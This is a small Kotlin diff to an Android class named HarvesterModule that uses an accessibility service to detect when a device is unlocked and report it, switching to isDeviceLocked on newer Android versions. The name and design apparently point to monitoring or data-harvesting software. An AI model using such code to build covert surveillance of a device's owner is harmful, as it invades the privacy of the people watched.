@@ -32,7 +32,11 @@ class HarvesterModule(private val service: AccessibilityService) {
 
     fun onAccessibilityEvent(event: AccessibilityEvent) {
         try {
-            val isLocked = keyguardManager.isKeyguardLocked
+            val isLocked = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+                keyguardManager.isDeviceLocked
+            } else {
+                keyguardManager.isKeyguardLocked
+            }
 
             if (wasLocked && !isLocked) {
                 reportUnlock()
